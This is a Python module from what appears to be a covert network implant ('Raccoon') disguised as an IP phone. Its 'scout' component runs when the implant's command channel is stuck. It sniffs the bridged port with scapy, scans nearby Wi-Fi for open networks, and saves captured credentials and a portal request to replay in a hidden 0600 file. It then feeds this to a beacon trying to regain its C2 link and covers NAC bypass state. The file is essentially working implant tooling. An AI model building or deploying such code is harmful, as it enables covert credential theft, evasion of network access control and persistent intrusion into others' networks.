#!/usr/bin/env python3
"""The scout: watch the tapped port while the beacon is stuck, and publish.

This is the dependency-heavy half of the way out, and it is a separate
process for a reason that is written into `beacon.py`: that file is served
to a target as source text and may import only the standard library, so
scapy, PyYAML and a model client cannot live there. The two halves meet
over files -- see `handoff.py`.

**Quiet on a healthy implant.** Nothing here captures, scans or publishes
until the beacon's state file says a stuck window is open. A second
promiscuous reader on a device whose whole budget is about 13 W, and which
is already bridging and capturing, is a cost; it is paid only while there
is something to pay it for. `wanted()` is the question the loop asks.

**Its own narrow capture, not the sniffer's pcaps.** Reading those would
make the evidence path depend on `sniffer.encrypt_captures`, an operator's
storage choice; and calling into `BridgeTap` would couple the C2 half to
the sniffer that `beacon.py` deliberately does not import. So it runs one
`scapy.sniff` with `evidence.BPF_FILTER` -- five protocols, each a row of
the design's evidence table.

**Two documents out, and the split is the point.** `way_out_scout.json` is
the handoff the beacon reads every stuck cycle: counts, names and flags,
no secret. `way_out_borrow.json` is 0600 and holds the credentials
themselves and the portal request to replay; only a borrow verb opens it.
A handoff carrying passwords would be a second place they can be found on
a device built to look like an IP phone.

**The trail is the scout's.** The beacon records its attempts into the one
file it writes, and that file is removed when a leg delivers. This copies
each new attempt onto an append-only trail, which is what makes a burned
implant a lesson instead of a mystery.

**Nothing here raises.** It runs unattended on a device nobody can reach.
"""

import argparse
import logging
import os
import re
import subprocess
import sys
import time
from typing import List, Optional

from . import handoff
from .evidence import BPF_FILTER, Evidence

logger = logging.getLogger("raccoon.scout")

_SYSFS_NET = "/sys/class/net"
# How long a scan and the capture slice are given. Short, because this runs
# on a device that is bridging at the same time.
_SCAN_TIMEOUT = 20
_CAPTURE_SLICE = 15


class Scout(object):
    """One stuck window's evidence, and the document that carries it."""

    def __init__(self, config: dict, state_dir: str):
        self.config = config or {}
        self.state_dir = state_dir
        self.bridge = ((self.config.get("network") or {})
                       .get("bridge_name") or "br0")
        self.evidence = Evidence()
        self._running = True
        # Which of the open window's attempts have reached the trail, and
        # which window those are counted for. Keyed by the window's
        # `opened` stamp, so a new window starts counting again rather than
        # silently dropping its first attempts.
        self._trailed_window = None     # type: Optional[float]
        self._trailed = 0

    # ── the question the loop asks ──

    def wanted(self) -> bool:
        """Whether there is a stuck window to collect evidence for."""
        return handoff.read_state(self.state_dir) is not None

    def observe(self, packet) -> None:
        """One captured frame. Raises nothing, whatever it is."""
        self.evidence.observe(packet)

    def stop(self) -> None:
        self._running = False

    # ── publishing ──

    def publish_once(self) -> Optional[dict]:
        """Publish one document, or None while the beacon is not stuck.

        Never raises. A directory that cannot be written costs one warning
        and the beacon degrades to its policy, which is the property that
        makes a dead scout harmless.
        """
        state = handoff.read_state(self.state_dir)
        if state is None:
            return None
        # Computed once and handed to both: the scan costs a radio command,
        # and the model is asked about the same reading the beacon is given.
        tap = self._tap_fields()
        document = {
            "version": handoff.DOCUMENT_VERSION,
            "published": time.time(),
            # Copied through unchanged. The beacon matches a recommendation
            # against the evidence it was made for, so a scout that
            # rewrote this would make every recommendation look stale.
            "evidence": state.get("evidence"),
            "tap": tap,
            "identity_pre_spent": self._identity_spent(),
            "recommendation": self._recommendation(state, tap),
        }
        try:
            handoff.write_document(self.state_dir, document)
            handoff.write_borrow(self.state_dir,
                                 self.evidence.as_borrow_fields())
        except (OSError, ValueError) as exc:
            logger.warning(
                "scout: nothing could be published to %s (%s), so the beacon "
                "will decide on its policy alone", self.state_dir, exc)
            return None
        self._append_trail(state, document)
        return document

    def _tap_fields(self) -> dict:
        fields = self.evidence.as_document_fields()
        fields["ssids"] = self._scan_ssids()
        return fields

    def _identity_spent(self) -> bool:
        """Whether rung 4 is already spent, which only this side can know.

        Two ways, and both are true statements about the same thing: the
        operator set `nac_bypass.enabled`, so the identity was taken at
        boot; or a request was made and taken in an earlier window.
        """
        if (self.config.get("nac_bypass") or {}).get("enabled"):
            return True
        request = handoff.read_document_at(
            handoff.identity_path(self.state_dir), handoff.STATE_VERSION)
        return bool(request and request.get("taken"))

    def _recommendation(self, state: dict, tap: dict) -> Optional[dict]:
        """The model's answer, or None. Off unless configured on.

        Stage 4 of this work, and it ships off: without a device nobody
        can say what inference costs on PoE, so the first operator to
        switch it on is the first measurement.
        """
        model = self._model_block()
        if not model.get("enabled"):
            return None
        from .model import ask
        return ask(model, state, tap)

    def _model_block(self) -> dict:
        return (((self.config.get("c2") or {}).get("way_out") or {})
                .get("model") or {})

    # ── the trail ──

    def _append_trail(self, state: dict, document: dict) -> None:
        """Copy this window's new attempts onto the append-only trail.

        The beacon's file is removed when a leg delivers, so without this
        a rescue that ended in a burned port would leave nothing to read.
        A failure to append costs the trail and not the document: the
        beacon's next decision matters more than the record of the last.
        """
        window = state.get("opened")
        if window != self._trailed_window:
            self._trailed_window = window
            self._trailed = 0
        attempts = [entry for entry in (state.get("attempts") or [])
                    if isinstance(entry, dict)]
        for entry in attempts[self._trailed:]:
            line = dict(entry)
            line["window"] = window
            line.setdefault("evidence", state.get("evidence"))
            try:
                handoff.append_trail(self.state_dir, line)
            except (OSError, ValueError) as exc:
                logger.warning("scout: the trail could not be appended to "
                               "(%s); the attempt is in the beacon's log",
                               exc)
                return
        self._trailed = len(attempts)

    # ── the radio ──

    def _run(self, argv: List[str], timeout: int = _SCAN_TIMEOUT):
        """One command, as `(returncode, output)`. Never raises."""
        try:
            done = subprocess.run(argv, capture_output=True, text=True,
                                  timeout=timeout)
        except (OSError, subprocess.SubprocessError) as exc:
            return 1, str(exc)
        return done.returncode, (done.stdout or "") + (done.stderr or "")

    def _radio_iface(self) -> Optional[str]:
        """The first wireless interface, or None.

        The USB question belongs to the rung that *associates*, not to the
        scan: knowing which networks are in range costs nothing either way,
        and `Beacon._radio_iface` is where the 13 W budget refuses an
        adapter.
        """
        try:
            names = sorted(os.listdir(_SYSFS_NET))
        except OSError:
            return None
        for name in names:
            if os.path.exists(os.path.join(_SYSFS_NET, name, "wireless")):
                return name
        return None

    def _scan_ssids(self) -> List[dict]:
        """What the radio can see, and which of it is open. Never raises.

        Parsed from `iw scan`'s own output rather than through a library:
        the two facts needed are the name and whether the capability line
        says Privacy, and a dependency for that would be a package to
        install on a device nobody can reach.
        """
        iface = self._radio_iface()
        if iface is None:
            return []
        code, output = self._run(["iw", "dev", iface, "scan"])
        if code != 0:
            logger.debug("scout: the radio scan on %s failed: %s", iface,
                         output.strip()[:200])
            return []
        found = []
        ssid = None
        for line in output.splitlines():
            stripped = line.strip()
            if stripped.startswith("SSID: "):
                ssid = stripped[6:].strip()
                continue
            if ssid and stripped.startswith("capability:"):
                found.append({"ssid": ssid,
                              "open": "Privacy" not in stripped})
                ssid = None
        return found

    # ── the capture ──

    def capture_slice(self, seconds: int = _CAPTURE_SLICE) -> None:
        """Sniff the bridge for a few seconds. Never raises.

        Its own narrow capture with `BPF_FILTER`, not the sniffer's pcaps
        and not a callback into `BridgeTap`: see the module docstring.
        """
        from scapy.all import sniff
        try:
            sniff(iface=self.bridge, filter=BPF_FILTER, store=False,
                  prn=self.observe, timeout=seconds,
                  stop_filter=lambda _packet: not self._running)
        except Exception as exc:
            logger.warning("scout: the capture on %s stopped: %s",
                           self.bridge, exc)

    def run(self, interval: float) -> None:
        """Collect and publish for as long as the beacon is stuck.

        The loop sleeps while the implant is healthy, so the cost of this
        process on an implant that never loses its channel is one
        `read_state` per interval.
        """
        while self._running:
            if self.wanted():
                self.capture_slice()
                self.publish_once()
            else:
                # A window that closed is a window whose evidence is spent:
                # the next one starts from nothing, or a failure from three
                # outages ago would drive a decision today.
                self.evidence = Evidence()
                time.sleep(min(interval, 30))


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        description="The Raccoon implant's way-out scout")
    parser.add_argument("-c", "--config", help="Path to raccoon.yaml")
    args = parser.parse_args(argv)

    import yaml
    from software.c2.beacon import read_way_out_policy

    paths = [args.config, "/opt/raccoon/configs/raccoon.yaml",
             os.path.join(os.path.dirname(__file__), "..", "..", "configs",
                          "raccoon.yaml")]
    config = None
    for path in paths:
        if path and os.path.exists(path):
            with open(path) as handle:
                config = yaml.safe_load(handle) or {}
            break
    if config is None:
        print("No config file found", file=sys.stderr)
        return 1

    policy = read_way_out_policy((config.get("c2") or {}).get("way_out"))
    if not policy["enabled"] or not policy["state_dir"]:
        # Not an error. The scout ships with the feature off, and a unit
        # that exited 1 would restart for ever on a drop box that simply
        # does not want it.
        print("c2.way_out is off: the scout has nothing to do",
              file=sys.stderr)
        return 0

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [scout] %(levelname)s %(message)s")
    scout = Scout(config, policy["state_dir"])
    # Half the freshness window, so a published document is never stale by
    # the time the beacon's next cycle reads it.
    scout.run(max(1.0, policy["document_max_age_seconds"] / 2.0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
